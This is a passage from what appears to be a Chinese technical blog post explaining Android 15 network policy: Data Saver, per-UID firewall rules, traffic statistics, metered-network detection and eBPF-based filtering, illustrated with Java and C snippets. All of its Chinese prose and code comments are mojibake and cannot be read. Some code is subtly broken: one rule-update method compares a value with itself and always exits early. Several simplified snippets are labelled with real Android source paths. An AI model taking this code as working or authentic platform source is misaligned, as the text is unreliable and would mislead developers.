â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h4 data-id="heading-6">æ ¸å¿ƒæ•°æ®ç»“æ„</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// packages/modules/Connectivity/.../NetworkPolicyManagerService.java</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NetworkPolicyManagerService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">INetworkPolicyManager</span>.Stub {

    <span class="hljs-comment">// ç½‘ç»œç­–ç•¥é›†åˆ (æŒ‰NetworkTemplateåˆ†ç±»)</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ArrayMap&lt;NetworkTemplate, NetworkPolicy&gt; mNetworkPolicy =
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayMap</span>&lt;&gt;();

    <span class="hljs-comment">// UIDç­–ç•¥ (æ¯ä¸ªåº”ç”¨çš„ç½‘ç»œé™åˆ¶ç­–ç•¥)</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">SparseIntArray</span> <span class="hljs-variable">mUidPolicy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SparseIntArray</span>();

    <span class="hljs-comment">// UIDè§„åˆ™ (é˜²ç«å¢™è§„åˆ™ï¼šå…è®¸/æ‹’ç»)</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">SparseIntArray</span> <span class="hljs-variable">mUidRules</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SparseIntArray</span>();

    <span class="hljs-comment">// æŒ‰æµé‡è®¡è´¹ç½‘ç»œé›†åˆ</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ArraySet&lt;NetworkTemplate&gt; mMeteredIfaces = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArraySet</span>&lt;&gt;();

    <span class="hljs-comment">// Data Saveræ¨¡å¼å¼€å…³</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">mRestrictBackground</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;

    <span class="hljs-comment">// æ ¸å¿ƒæ–¹æ³•1ï¼šè®¾ç½®UIDç½‘ç»œç­–ç•¥</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUidPolicy</span><span class="hljs-params">(<span class="hljs-type">int</span> uid, <span class="hljs-type">int</span> policy)</span> {
        mContext.enforceCallingOrSelfPermission(MANAGE_NETWORK_POLICY, TAG);

        <span class="hljs-comment">// 1. æ›´æ–°ç­–ç•¥</span>
        <span class="hljs-keyword">if</span> (policy == POLICY_NONE) {
            mUidPolicy.delete(uid);
        } <span class="hljs-keyword">else</span> {
            mUidPolicy.put(uid, policy);
        }

        <span class="hljs-comment">// 2. æ›´æ–°é˜²ç«å¢™è§„åˆ™</span>
        updateRulesForDataUsageRestrictionsUL(uid);

        <span class="hljs-comment">// 3. æŒä¹…åŒ–åˆ°ç£ç›˜</span>
        writePolicyAL();

        <span class="hljs-comment">// 4. é€šçŸ¥ç›‘å¬å™¨</span>
        mHandler.obtainMessage(MSG_POLICIES_CHANGED, uid, policy).sendToTarget();
    }

    <span class="hljs-comment">// æ ¸å¿ƒæ–¹æ³•2ï¼šæ›´æ–°é˜²ç«å¢™è§„åˆ™</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateRulesForDataUsageRestrictionsUL</span><span class="hljs-params">(<span class="hljs-type">int</span> uid)</span> {
        <span class="hljs-comment">// è®¡ç®—æœ€ç»ˆçš„ç½‘ç»œè§„åˆ™</span>
        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">uidRules</span> <span class="hljs-operator">=</span> mUidRules.get(uid, RULE_NONE);
        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">oldUidRules</span> <span class="hljs-operator">=</span> mUidRules.get(uid, RULE_NONE);

        <span class="hljs-comment">// è§„åˆ™æ”¹å˜æ‰æ›´æ–°</span>
        <span class="hljs-keyword">if</span> (uidRules == oldUidRules) <span class="hljs-keyword">return</span>;

        <span class="hljs-comment">// æ›´æ–°è§„åˆ™åˆ°Kernel</span>
        setUidFirewallRulesUL(FIREWALL_CHAIN_STANDBY, uid,
                              uidRules &amp; RULE_REJECT_METERED);
        setUidFirewallRulesUL(FIREWALL_CHAIN_DOZABLE, uid,
                              uidRules &amp; RULE_REJECT_ALL);
        setUidFirewallRulesUL(FIREWALL_CHAIN_POWERSAVE, uid,
                              uidRules &amp; RULE_REJECT_ALL);

        <span class="hljs-comment">// Android 15: ä½¿ç”¨eBPFä»£æ›¿iptables</span>
        <span class="hljs-keyword">if</span> (mUseBpfTrafficStats) {
            mBpfNetMaps.setUidRule(uid, uidRules);
        }
    }

    <span class="hljs-comment">// æ ¸å¿ƒæ–¹æ³•3ï¼šè®¾ç½®Data Saveræ¨¡å¼</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setRestrictBackground</span><span class="hljs-params">(<span class="hljs-type">boolean</span> restrictBackground)</span> {
        mContext.enforceCallingOrSelfPermission(MANAGE_NETWORK_POLICY, TAG);

        <span class="hljs-keyword">if</span> (mRestrictBackground == restrictBackground) <span class="hljs-keyword">return</span>;

        mRestrictBackground = restrictBackground;

        <span class="hljs-comment">// æ›´æ–°æ‰€æœ‰åº”ç”¨çš„ç½‘ç»œè§„åˆ™</span>
        updateRulesForRestrictBackgroundUL();

        <span class="hljs-comment">// é€šçŸ¥ç³»ç»ŸæœåŠ¡</span>
        mHandler.obtainMessage(MSG_RESTRICT_BACKGROUND_CHANGED,
                               restrictBackground ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>, <span class="hljs-number">0</span>).sendToTarget();
    }
}
</code></pre>
<h3 data-id="heading-7">1.2 Data Saverçœæµæ¨¡å¼è¯¦è§£</h3>
<p><strong>Data Saver</strong>æ˜¯Android 7.0å¼•å…¥çš„çœæµåŠŸèƒ½ï¼Œåœ¨Android 15ä¸­å¾—åˆ°äº†eBPFçš„æ€§èƒ½å¢å¼ºã€‚</p>
<h4 data-id="heading-8">å·¥ä½œåŸç†</h4>
<pre><code class="hljs language-markdown" lang="markdown">ç”¨æˆ·å¼€å¯Data Saverå:

<span class="hljs-bullet">1.</span> åå°åº”ç”¨ç½‘ç»œè¢«ç¦ç”¨
   â†’ é™¤éåº”ç”¨åœ¨ç™½åå•ä¸­

<span class="hljs-bullet">2.</span> å‰å°åº”ç”¨å¯ä»¥æ­£å¸¸è”ç½‘
   â†’ ä½†ä¼šæ”¶åˆ°DATA<span class="hljs-emphasis">_SAVER_</span>ENABLEDå›è°ƒ

<span class="hljs-bullet">3.</span> åº”ç”¨å¯ä»¥è¯·æ±‚ç™½åå•æƒé™
   â†’ POLICY<span class="hljs-emphasis">_ALLOW_</span>METERED<span class="hljs-emphasis">_BACKGROUND

4. ç³»ç»ŸæœåŠ¡ä¸å—å½±å“
   â†’ UID &lt; 10000çš„ç³»ç»Ÿè¿›ç¨‹è±å…
</span></code></pre>
<h4 data-id="heading-9">åº”ç”¨ç¤ºä¾‹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åº”ç”¨å±‚ - æ£€æµ‹Data SaverçŠ¶æ€</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataSaverChecker</span> {

    <span class="hljs-keyword">private</span> ConnectivityManager mCm;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkDataSaver</span><span class="hljs-params">(Context context)</span> {
        mCm = (ConnectivityManager) context.getSystemService(
            Context.CONNECTIVITY_SERVICE);

        <span class="hljs-comment">// 1. è·å–Data SaverçŠ¶æ€</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> mCm.getRestrictBackgroundStatus();

        <span class="hljs-keyword">switch</span> (status) {
            <span class="hljs-keyword">case</span> RESTRICT_BACKGROUND_STATUS_DISABLED:
                <span class="hljs-comment">// Data Saverå…³é—­ï¼Œæ— é™åˆ¶</span>
                Log.d(TAG, <span class="hljs-string">"Data Saverå…³é—­"</span>);
                <span class="hljs-keyword">break</span>;

            <span class="hljs-keyword">case</span> RESTRICT_BACKGROUND_STATUS_ENABLED:
                <span class="hljs-comment">// Data Saverå¼€å¯ï¼Œåå°æ•°æ®è¢«ç¦ç”¨</span>
                Log.w(TAG, <span class="hljs-string">"Data Saverå¼€å¯ï¼Œåå°æ•°æ®å—é™"</span>);
                <span class="hljs-comment">// å»ºè®®ï¼šå»¶è¿Ÿéç´§æ€¥çš„ç½‘ç»œè¯·æ±‚</span>
                postponeNonUrgentRequests();
                <span class="hljs-keyword">break</span>;

            <span class="hljs-keyword">case</span> RESTRICT_BACKGROUND_STATUS_WHITELISTED:
                <span class="hljs-comment">// åº”ç”¨åœ¨ç™½åå•ä¸­ï¼Œä¸å—é™åˆ¶</span>
                Log.d(TAG, <span class="hljs-string">"åº”ç”¨åœ¨Data Saverç™½åå•"</span>);
                <span class="hljs-keyword">break</span>;
        }
    }

    <span class="hljs-comment">// 2. ç›‘å¬Data Saverå˜åŒ–</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerDataSaverListener</span><span class="hljs-params">(Context context)</span> {
        mCm.registerDefaultNetworkCallback(<span class="hljs-keyword">new</span> <span class="hljs-title class_">NetworkCallback</span>() {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCapabilitiesChanged</span><span class="hljs-params">(Network network,
                                             NetworkCapabilities nc)</span> {
                <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æœ‰NOT_METEREDèƒ½åŠ›</span>
                <span class="hljs-type">boolean</span> <span class="hljs-variable">isMetered</span> <span class="hljs-operator">=</span> !nc.hasCapability(
                    NET_CAPABILITY_NOT_METERED);

                <span class="hljs-keyword">if</span> (isMetered &amp;&amp; isDataSaverEnabled()) {
                    <span class="hljs-comment">// åœ¨æŒ‰æµé‡è®¡è´¹ç½‘ç»œ + Data Saverå¼€å¯</span>
                    showDataSaverWarning();
                }
            }
        });
    }

    <span class="hljs-comment">// 3. åº”ç”¨ä¼˜åŒ–å»ºè®®</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">optimizeForDataSaver</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (isDataSaverEnabled()) {
            <span class="hljs-comment">// å‡å°‘é¢„åŠ è½½</span>
            disablePrefetching();

            <span class="hljs-comment">// é™ä½å›¾ç‰‡è´¨é‡</span>
            setImageQuality(QUALITY_LOW);

            <span class="hljs-comment">// ç¦ç”¨è‡ªåŠ¨æ’­æ”¾è§†é¢‘</span>
            disableAutoplayVideos();

            <span class="hljs-comment">// å»¶è¿Ÿå¤§æ–‡ä»¶ä¸‹è½½</span>
            pauseLargeDownloads();
        }
    }
}
</code></pre>
<h4 data-id="heading-10">Frameworkå±‚å®ç°</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// NetworkPolicyManagerService.java</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateRulesForRestrictBackgroundUL</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// éå†æ‰€æœ‰UID</span>
    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> mUidPolicy.size();
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; size; i++) {
        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">uid</span> <span class="hljs-operator">=</span> mUidPolicy.keyAt(i);
        <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">policy</span> <span class="hljs-operator">=</span> mUidPolicy.valueAt(i);

        <span class="hljs-comment">// è®¡ç®—è§„åˆ™</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">uidRules</span> <span class="hljs-operator">=</span> RULE_NONE;
        <span class="hljs-keyword">if</span> (mRestrictBackground) {
            <span class="hljs-comment">// Data Saverå¼€å¯</span>
            <span class="hljs-keyword">if</span> (!hasWhitelistExemption(policy)) {
                <span class="hljs-comment">// ä¸åœ¨ç™½åå•ï¼Œç¦æ­¢åå°æ•°æ®</span>
                uidRules |= RULE_REJECT_METERED;
            }
        }

        <span class="hljs-comment">// åº”ç”¨è§„åˆ™</span>
        setUidFirewallRule(FIREWALL_CHAIN_STANDBY, uid, uidRules);
    }
}

<span class="hljs-comment">// æ£€æŸ¥ç™½åå•</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasWhitelistExemption</span><span class="hljs-params">(<span class="hljs-type">int</span> policy)</span> {
    <span class="hljs-comment">// å…è®¸æŒ‰æµé‡è®¡è´¹ç½‘ç»œçš„åå°æ•°æ®</span>
    <span class="hljs-keyword">return</span> (policy &amp; POLICY_ALLOW_METERED_BACKGROUND) != <span class="hljs-number">0</span>;
}
</code></pre>
<h3 data-id="heading-11">1.3 æµé‡ç»Ÿè®¡NetworkStatsService</h3>
<p><strong>æ ¸å¿ƒåŠŸèƒ½</strong>ï¼šå®æ—¶ç»Ÿè®¡åº”ç”¨å’Œç½‘ç»œæ¥å£çš„æµé‡æ•°æ®ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// packages/modules/Connectivity/.../NetworkStatsService.java</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NetworkStatsService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">INetworkStatsService</span>.Stub {

    <span class="hljs-comment">// UIDç»´åº¦ç»Ÿè®¡</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> NetworkStatsRecorder mUidRecorder;

    <span class="hljs-comment">// Interfaceç»´åº¦ç»Ÿè®¡</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> NetworkStatsRecorder mUidTagRecorder;

    <span class="hljs-comment">// æ ¸å¿ƒæ–¹æ³•ï¼šè·å–UIDæµé‡ç»Ÿè®¡</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> NetworkStats <span class="hljs-title function_">getUidStats</span><span class="hljs-params">(<span class="hljs-type">int</span> uid, NetworkTemplate template)</span> {
        <span class="hljs-comment">// 1. ä»BPFè¯»å–ç»Ÿè®¡æ•°æ® (Android 15)</span>
        <span class="hljs-type">NetworkStats</span> <span class="hljs-variable">stats</span> <span class="hljs-operator">=</span> mBpfNetMaps.readStatsForUid(uid);

        <span class="hljs-comment">// 2. åˆå¹¶å†å²æ•°æ®</span>
        stats.combineWith(mUidRecorder.getOrLoadHistoryFor(uid, template));

        <span class="hljs-comment">// 3. è¿”å›ç»“æœ</span>
        <span class="hljs-keyword">return</span> stats;
    }

    <span class="hljs-comment">// è½®è¯¢æ›´æ–°ç»Ÿè®¡æ•°æ®</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">performPoll</span><span class="hljs-params">(<span class="hljs-type">int</span> flags)</span> {
        <span class="hljs-comment">// 1. ä»Kernelè¯»å–æœ€æ–°æ•°æ®</span>
        <span class="hljs-keyword">final</span> <span class="hljs-type">NetworkStats</span> <span class="hljs-variable">xtSnapshot</span> <span class="hljs-operator">=</span> readNetworkStatsUidDetail(UID_ALL);

        <span class="hljs-comment">// 2. è®¡ç®—å¢é‡</span>
        <span class="hljs-keyword">final</span> <span class="hljs-type">NetworkStats</span> <span class="hljs-variable">delta</span> <span class="hljs-operator">=</span> xtSnapshot.subtract(mLastStatsSnapshot);
        mLastStatsSnapshot = xtSnapshot;

        <span class="hljs-comment">// 3. è®°å½•åˆ°å†å²</span>
        mUidRecorder.recordSnapshotLocked(delta, System.currentTimeMillis());

        <span class="hljs-comment">// 4. æ£€æŸ¥æµé‡é…é¢</span>
        mPolicyListener.onStatsUpdated(delta);
    }
}
</code></pre>
<h4 data-id="heading-12">åº”ç”¨å±‚ä½¿ç”¨TrafficStats</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æŸ¥è¯¢åº”ç”¨æµé‡</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TrafficStatsExample</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">showAppTraffic</span><span class="hljs-params">(<span class="hljs-type">int</span> uid)</span> {
        <span class="hljs-comment">// 1. è·å–æ¥æ”¶å­—èŠ‚æ•°</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">rxBytes</span> <span class="hljs-operator">=</span> TrafficStats.getUidRxBytes(uid);

        <span class="hljs-comment">// 2. è·å–å‘é€å­—èŠ‚æ•°</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">txBytes</span> <span class="hljs-operator">=</span> TrafficStats.getUidTxBytes(uid);

        <span class="hljs-comment">// 3. è·å–æ¥æ”¶æ•°æ®åŒ…æ•°</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">rxPackets</span> <span class="hljs-operator">=</span> TrafficStats.getUidRxPackets(uid);

        <span class="hljs-comment">// 4. è·å–å‘é€æ•°æ®åŒ…æ•°</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">txPackets</span> <span class="hljs-operator">=</span> TrafficStats.getUidTxPackets(uid);

        Log.d(TAG, String.format(
            <span class="hljs-string">"UID %d: RX=%s TX=%s"</span>,
            uid,
            humanReadableByteCount(rxBytes),
            humanReadableByteCount(txBytes)
        ));
    }

    <span class="hljs-comment">// æ ‡è®°Socket (ç”¨äºç»†ç²’åº¦ç»Ÿè®¡)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">tagSocket</span><span class="hljs-params">(Socket socket, <span class="hljs-type">int</span> tag)</span> {
        <span class="hljs-comment">// è®¾ç½®çº¿ç¨‹çš„æµé‡æ ‡ç­¾</span>
        TrafficStats.setThreadStatsTag(tag);

        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// æ ‡è®°Socket</span>
            TrafficStats.tagSocket(socket);

            <span class="hljs-comment">// è¿›è¡Œç½‘ç»œæ“ä½œ...</span>
            socket.connect(address);

        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-comment">// å–æ¶ˆæ ‡ç­¾</span>
            TrafficStats.untagSocket(socket);
            TrafficStats.clearThreadStatsTag();
        }
    }

    <span class="hljs-comment">// æ ¼å¼åŒ–æµé‡æ˜¾ç¤º</span>
    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">humanReadableByteCount</span><span class="hljs-params">(<span class="hljs-type">long</span> bytes)</span> {
        <span class="hljs-keyword">if</span> (bytes &lt; <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> bytes + <span class="hljs-string">" B"</span>;
        <span class="hljs-type">int</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) (Math.log(bytes) / Math.log(<span class="hljs-number">1024</span>));
        <span class="hljs-type">char</span> <span class="hljs-variable">pre</span> <span class="hljs-operator">=</span> <span class="hljs-string">"KMGTPE"</span>.charAt(exp - <span class="hljs-number">1</span>);
        <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">"%.1f %sB"</span>,
                           bytes / Math.pow(<span class="hljs-number">1024</span>, exp), pre);
    }
}
</code></pre>
<h3 data-id="heading-13">1.4 æŒ‰æµé‡è®¡è´¹ç½‘ç»œè¯†åˆ«</h3>
<p>Androidéœ€è¦è¯†åˆ«å“ªäº›ç½‘ç»œæ˜¯<strong>æŒ‰æµé‡è®¡è´¹</strong>çš„ï¼ˆMetered Networkï¼‰ï¼Œä»¥ä¾¿åº”ç”¨ä¼˜åŒ–è¡Œä¸ºã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// NetworkCapabilitiesä¸­çš„èƒ½åŠ›æ ‡è¯†</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NetworkCapabilities</span> {
    <span class="hljs-comment">// éè®¡è´¹ç½‘ç»œï¼ˆå¦‚å®¶åº­WiFiï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">NET_CAPABILITY_NOT_METERED</span> <span class="hljs-operator">=</span> <span class="hljs-number">11</span>;

    <span class="hljs-comment">// ä¸´æ—¶éè®¡è´¹ï¼ˆå¦‚è¿è¥å•†å…è´¹æµé‡ï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">NET_CAPABILITY_TEMPORARILY_NOT_METERED</span> <span class="hljs-operator">=</span> <span class="hljs-number">25</span>;
}
</code></pre>
<h4 data-id="heading-14">è¯†åˆ«é€»è¾‘</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ConnectivityService.java</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateMeteredStatus</span><span class="hljs-params">(NetworkAgentInfo nai)</span> {
    <span class="hljs-type">NetworkCapabilities</span> <span class="hljs-variable">nc</span> <span class="hljs-operator">=</span> nai.networkCapabilities;

    <span class="hljs-comment">// 1. WiFié»˜è®¤éè®¡è´¹</span>
    <span class="hljs-keyword">if</span> (nc.hasTransport(TRANSPORT_WIFI)) {
        nc.addCapability(NET_CAPABILITY_NOT_METERED);
    }

    <span class="hljs-comment">// 2. ç§»åŠ¨ç½‘ç»œé»˜è®¤è®¡è´¹</span>
    <span class="hljs-keyword">if</span> (nc.hasTransport(TRANSPORT_CELLULAR)) {
        nc.removeCapability(NET_CAPABILITY_NOT_METERED);
    }

    <span class="hljs-comment">// 3. ä½†å¯ä»¥è¢«é…ç½®è¦†ç›–</span>
    <span class="hljs-keyword">if</span> (mNetworkPolicies.isNetworkMetered(nai)) {
        nc.removeCapability(NET_CAPABILITY_NOT_METERED);
    }
}
</code></pre>
<h4 data-id="heading-15">åº”ç”¨æ£€æŸ¥ç¤ºä¾‹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isCurrentNetworkMetered</span><span class="hljs-params">(Context context)</span> {
    <span class="hljs-type">ConnectivityManager</span> <span class="hljs-variable">cm</span> <span class="hljs-operator">=</span> (ConnectivityManager)
        context.getSystemService(Context.CONNECTIVITY_SERVICE);

    <span class="hljs-comment">// 1. è·å–å½“å‰ç½‘ç»œ</span>
    <span class="hljs-type">Network</span> <span class="hljs-variable">network</span> <span class="hljs-operator">=</span> cm.getActiveNetwork();
    <span class="hljs-keyword">if</span> (network == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// å®‰å…¨èµ·è§ï¼Œå‡è®¾è®¡è´¹</span>

    <span class="hljs-comment">// 2. è·å–èƒ½åŠ›</span>
    <span class="hljs-type">NetworkCapabilities</span> <span class="hljs-variable">capabilities</span> <span class="hljs-operator">=</span> cm.getNetworkCapabilities(network);
    <span class="hljs-keyword">if</span> (capabilities == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;

    <span class="hljs-comment">// 3. æ£€æŸ¥æ˜¯å¦éè®¡è´¹</span>
    <span class="hljs-keyword">return</span> !capabilities.hasCapability(NET_CAPABILITY_NOT_METERED);
}
</code></pre>
<h3 data-id="heading-16">1.5 Android 15æ–°ç‰¹æ€§ï¼šeBPFç½‘ç»œç­–ç•¥</h3>
<p>Android 15ä½¿ç”¨**eBPF (extended Berkeley Packet Filter)**æ›¿ä»£ä¼ ç»Ÿçš„iptablesï¼Œæ€§èƒ½æå‡æ˜¾è‘—ã€‚</p>
<h4 data-id="heading-17">eBPF vs iptableså¯¹æ¯”</h4>



































<table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">iptables</th><th align="left">eBPF (Android 15)</th></tr></thead><tbody><tr><td align="left">è§„åˆ™åŒ¹é…</td><td align="left">çº¿æ€§æ‰«æ O(n)</td><td align="left">å“ˆå¸ŒæŸ¥æ‰¾ O(1)</td></tr><tr><td align="left">å»¶è¿Ÿ</td><td align="left">~100Î¼s</td><td align="left">~10Î¼s</td></tr><tr><td align="left">å†…æ ¸æ€åˆ‡æ¢</td><td align="left">éœ€è¦</td><td align="left">ä¸éœ€è¦</td></tr><tr><td align="left">åŠ¨æ€æ›´æ–°</td><td align="left">é”å…¨è¡¨</td><td align="left">æ— é”æ›´æ–°</td></tr><tr><td align="left">CPUå ç”¨</td><td align="left">é«˜</td><td align="left">ä½</td></tr></tbody></table>
<h4 data-id="heading-18">eBPFå®ç°åŸç†</h4>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// system/netd/bpf_progs/netd.c</span>

<span class="hljs-comment">// BPFç¨‹åº - UIDæµé‡æ§åˆ¶</span>
SEC(<span class="hljs-string">"cgroupskb/ingress/stats"</span>)
<span class="hljs-type">int</span> <span class="hljs-title function_">bpf_traffic_account</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> __sk_buff *skb)</span> {
    <span class="hljs-comment">// 1. è·å–UID</span>
    <span class="hljs-type">uint32_t</span> uid = bpf_get_socket_uid(skb);

    <span class="hljs-comment">// 2. æŸ¥è¯¢UIDè§„åˆ™</span>
    <span class="hljs-type">uint8_t</span> *rule = bpf_uid_permission_map_lookup_elem(&amp;uid);

    <span class="hljs-comment">// 3. æ£€æŸ¥æƒé™</span>
    <span class="hljs-keyword">if</span> (rule &amp;&amp; (*rule &amp; BPF_PERMISSION_INTERNET) == <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// æ‹’ç»ï¼šä¸¢å¼ƒæ•°æ®åŒ…</span>
    }

    <span class="hljs-comment">// 4. ç»Ÿè®¡æµé‡</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stats_value</span> *<span class="hljs-title">value</span> =</span> bpf_uid_stats_map_lookup_elem(&amp;uid);
    <span class="hljs-keyword">if</span> (value) {
        __sync_fetch_and_add(&amp;value-&gt;rxBytes, skb-&gt;len);
        __sync_fetch_and_add(&amp;value-&gt;rxPackets, <span class="hljs-number">1</span>);
    }

    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;  <span class="hljs-comment">// å…è®¸ï¼šç»§ç»­ä¼ è¾“</span>
}

<span class="hljs-comment">// BPF Map - UIDæƒé™è¡¨</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, <span class="hljs-type">uint32_t</span>);    <span class="hljs-comment">// UID</span>
    __type(value, <span class="hljs-type">uint8_t</span>);   <span class="hljs-comment">// æƒé™æ ‡å¿—</span>
    __uint(max_entries, <span class="hljs-number">10000</span>);
} uid_permission_map <span class="hljs-title function_">SEC</span><span class="hljs-params">(<span class="hljs-string">".maps"</span>)</span>;

<span class="hljs-comment">// BPF Map - UIDæµé‡ç»Ÿè®¡</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, <span class="hljs-type">uint32_t</span>);    <span class="hljs-comment">// UID</span>
    __type(value, <span class="hljs-keyword">struct</span> stats_value);
    __uint(max_entries, <span class="hljs-number">10000</span>);
} uid_stats_map <span class="hljs-title function_">SEC</span><span class="hljs-params">(<span class="hljs-string">".maps"</span>)</span>;
</code></pre>
<h4 data-id="heading-19">Javaå±‚æ¥å£</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// frameworks/base/.../BpfNetMaps.java</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BpfNetMaps</span> {

    <span class="hljs-comment">// è®¾ç½®UIDç½‘ç»œè§„åˆ™</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUidRule</span><span class="hljs-params">(<span class="hljs-type">int</span> uid, <span class="hljs-type">int</span> rule)</span> {
        <span class="hljs-comment">// ç›´æ¥æ›´æ–°BPF Map</span>
        mUidPermissionMap.updateEntry(
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">UidPermissionKey</span>(uid),
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">UidPermissionValue</span>(rule)
        );
    }

    <span class="hljs-comment">// è¯»å–UIDæµé‡ç»Ÿè®¡</span>
    <span class="hljs-keyword">public</span> NetworkStats <span class="hljs-title function_">readStatsForUid</span><span class="hljs-params">(<span class="hljs-type">int</span> uid)</span> {
        <span class="hljs-type">UidStatsValue</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> mUidStatsMap.getValue(
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">UidStatsKey</span>(uid)
        );

